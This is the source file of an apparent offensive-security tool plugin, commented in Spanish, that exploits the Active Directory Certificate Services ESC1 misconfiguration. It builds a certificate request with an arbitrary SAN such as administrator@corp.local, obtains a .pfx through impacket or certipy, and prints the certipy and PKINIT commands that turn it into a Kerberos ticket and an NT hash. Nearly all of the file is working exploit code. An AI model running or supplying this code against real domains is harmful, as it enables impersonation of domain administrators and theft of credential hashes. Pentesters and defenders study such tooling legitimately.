# scripts/ldap/adcs/request-cert.py
"""
Solicita un certificado a una CA de ADCS explotando ESC1:
  - Especifica un SAN (Subject Alternative Name) arbitrario en la solicitud
  - Obtiene un certificado que puede usarse para autenticarse como el usuario del SAN
  - Convierte el certificado .pfx a hash NT via PKINIT (Kerberos)

Flujo completo ESC1:
  1. enum-templates → identifica plantilla vulnerable con SAN libre
  2. request-cert   → solicita cert con SAN=Administrador (o el usuario que quieras)
  3. El .pfx resultante se usa con certipy/impacket PKINIT → TGT → NT hash

Requiere:
  - Credenciales de dominio (cualquier usuario con permiso de enroll en la plantilla)
  - Nombre de la plantilla vulnerable (--template)
  - Usuario a impersonar (--upn): ej. administrator@corp.local
  - Nombre o IP de la CA (--ca)
  - impacket >= 0.10 con módulo certsrv/msrpc

Uso:
  lobera.py ldap --script=request-cert -t 10.10.10.5 -u iker -p 'Pass1' -d CORP.LOCAL
                 --template VulnTemplate --upn administrator@corp.local --ca CORP-CA
"""

import os
import sys
from scripts.base import BaseScript
from core.output import print_result, console
from core import session_db


class Script(BaseScript):
    name        = "request-cert"
    protocol    = "ldap"
    category    = "adcs"
    description = (
        "Solicita un certificado ADCS con SAN arbitrario (ESC1). "
        "Genera .pfx para autenticación como cualquier usuario del dominio."
    )

    EXAMPLES = [
        {
            "flag":  "--template / --upn / --ca",
            "desc":  "Plantilla vulnerable, usuario a impersonar y nombre de la CA",
            "good":  "lobera.py ldap --script=request-cert -t 10.10.10.5 -u iker -p 'Pass1' -d CORP.LOCAL --template VulnTemplate --upn administrator@corp.local --ca CORP-CA",
            "bad":   "lobera.py ldap --script=request-cert -t 10.10.10.5  [faltan --template, --upn y --ca]",
        },
    ]

    def run(self, **kwargs):
        template = kwargs.get("template") or getattr(self, "_args_template", None)
        upn      = kwargs.get("upn")
        ca_name  = kwargs.get("ca")
        out_pfx  = kwargs.get("out") or f"{upn.split('@')[0] if upn else 'cert'}.pfx"

        if not template or not upn or not ca_name:
            console.print("[red]Faltan parámetros: --template, --upn y --ca son obligatorios[/red]")
            console.print("  Ejemplo: --template VulnTemplate --upn administrator@corp.local --ca CORP-CA")
            return

        console.rule("[bold yellow]ADCS — Solicitud de certificado (ESC1)[/bold yellow]")
        console.print(f"  Plantilla : [cyan]{template}[/cyan]")
        console.print(f"  SAN (UPN) : [cyan]{upn}[/cyan]")
        console.print(f"  CA        : [cyan]{ca_name}[/cyan]")
        console.print(f"  Salida    : [cyan]{out_pfx}[/cyan]")

        # Intentar con impacket certsrv si está disponible
        try:
            result = self._request_via_impacket(template, upn, ca_name, out_pfx)
        except ImportError:
            result = None
            console.print("[yellow]⚠ impacket.certsrv no disponible — intentando con certipy[/yellow]")

        if result is None:
            result = self._request_via_certipy(template, upn, ca_name, out_pfx)

        if result:
            print_result("LDAP", str(self.target.ip), "pwned",
                         f"Certificado obtenido como {upn} → {out_pfx}")
            session_db.save_finding(
                self.target.ip, "LDAP", "adcs_esc1_cert",
                f"Certificado solicitado como {upn} usando plantilla {template} | salida: {out_pfx}",
            )
            console.print(f"\n[bold green]Siguiente paso — obtener TGT y hash NT:[/bold green]")
            console.print(f"  [dim]# Con certipy:[/dim]")
            console.print(f"  certipy auth -pfx {out_pfx} -dc-ip {self.target.ip}")
            console.print(f"  [dim]# Con impacket PKINIT:[/dim]")
            console.print(f"  python3 gettgtpkinit.py -cert-pfx {out_pfx} {upn.split('@')[-1]}/{upn.split('@')[0]} {upn.split('@')[0]}.ccache")
            console.print(f"  export KRB5CCNAME={upn.split('@')[0]}.ccache")
            console.print(f"  python3 getnthash.py -k {upn.split('@')[-1]}/{upn.split('@')[0]}")

    def _request_via_impacket(self, template: str, upn: str, ca_name: str, out_pfx: str):
        """
        Solicita el certificado usando impacket.krb5.cert (disponible en
        versiones recientes de impacket).
        Devuelve True si tiene éxito, None/False si falla.
        """
        try:
            from impacket.dcerpc.v5 import transport, rpcrt
            from impacket.dcerpc.v5.dcom.wmi import WBEM_E_NOT_FOUND
        except ImportError:
            raise ImportError("impacket.dcerpc no disponible")

        try:
            # Intentar via certsrv RPC (MS-WCCE)
            from impacket.certsrv import CertificateServiceClient

            target_host = self.target.hostname or self.target.ip
            client = CertificateServiceClient(
                target=target_host,
                username=self.creds.user,
                password=self.creds.password,
                domain=self.creds.domain or self.target.domain,
                hashes=self.creds.hash,
                caName=ca_name,
            )

            # Generar clave privada y solicitud CSR con SAN
            from cryptography.hazmat.primitives.asymmetric import rsa
            from cryptography.hazmat.backends import default_backend
            from cryptography import x509
            from cryptography.hazmat.primitives import hashes, serialization
            from cryptography.x509.oid import NameOID, ExtendedKeyUsageOID
            import datetime

            priv_key = rsa.generate_private_key(
                public_exponent=65537, key_size=2048, backend=default_backend()
            )
            csr = (
                x509.CertificateSigningRequestBuilder()
                .subject_name(x509.Name([
                    x509.NameAttribute(NameOID.COMMON_NAME, upn),
                ]))
                .add_extension(
                    x509.SubjectAlternativeName([
                        x509.OtherName(
                            x509.ObjectIdentifier("1.3.6.1.4.1.311.20.2.3"),
                            upn.encode(),
                        )
                    ]),
                    critical=False,
                )
                .sign(priv_key, hashes.SHA256(), default_backend())
            )

            csr_pem = csr.public_bytes(serialization.Encoding.PEM)
            cert_pem = client.request(template_name=template, csr=csr_pem)

            if cert_pem:
                # Guardar como .pfx
                from cryptography.hazmat.primitives.serialization import pkcs12
                pfx_data = pkcs12.serialize_key_and_certificates(
                    name=upn.encode(),
                    key=priv_key,
                    cert=x509.load_pem_x509_certificate(cert_pem, default_backend()),
                    cas=None,
                    encryption_algorithm=serialization.NoEncryption(),
                )
                with open(out_pfx, "wb") as f:
                    f.write(pfx_data)
                return True

        except ImportError:
            raise  # Propagar para intentar con certipy
        except Exception as e:
            console.print(f"  [yellow]impacket certsrv falló: {e}[/yellow]")
            return None

    def _request_via_certipy(self, template: str, upn: str, ca_name: str, out_pfx: str) -> bool:
        """
        Usa certipy-ad (si está instalado) como fallback.
        """
        import shutil, subprocess
        certipy = shutil.which("certipy") or shutil.which("certipy-ad")
        if not certipy:
            console.print("[red]certipy-ad no encontrado. Instálalo con: pip install certipy-ad[/red]")
            console.print("[dim]O solicita el certificado manualmente:[/dim]")
            self._print_manual_instructions(template, upn, ca_name)
            return False

        domain = self.creds.domain or self.target.domain or ""
        cmd = [
            certipy, "req",
            "-u", f"{self.creds.user}@{domain}",
            "-p", self.creds.password or "",
            "-dc-ip", str(self.target.ip),
            "-ca", ca_name,
            "-template", template,
            "-upn", upn,
            "-out", out_pfx.replace(".pfx",""),
        ]
        if self.creds.hash:
            cmd += ["-hashes", self.creds.hash]

        console.print(f"  [dim]Ejecutando certipy...[/dim]")
        try:
            res = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
            if res.returncode == 0:
                console.print(res.stdout)
                return True
            else:
                console.print(f"  [red]certipy falló:[/red] {res.stderr.strip()}")
                self._print_manual_instructions(template, upn, ca_name)
                return False
        except subprocess.TimeoutExpired:
            console.print("  [red]Timeout esperando a certipy[/red]")
            return False
        except Exception as e:
            console.print(f"  [red]Error ejecutando certipy: {e}[/red]")
            return False

    def _print_manual_instructions(self, template, upn, ca_name):
        domain = self.creds.domain or self.target.domain or "DOMAIN"
        console.print(f"\n[bold]Instrucciones manuales:[/bold]")
        console.print(f"  [dim]# certipy (recomendado):[/dim]")
        console.print(f"  pip install certipy-ad")
        console.print(f"  certipy req -u {self.creds.user}@{domain} -p '<pass>' \\")
        console.print(f"    -dc-ip {self.target.ip} -ca '{ca_name}' \\")
        console.print(f"    -template '{template}' -upn '{upn}'")
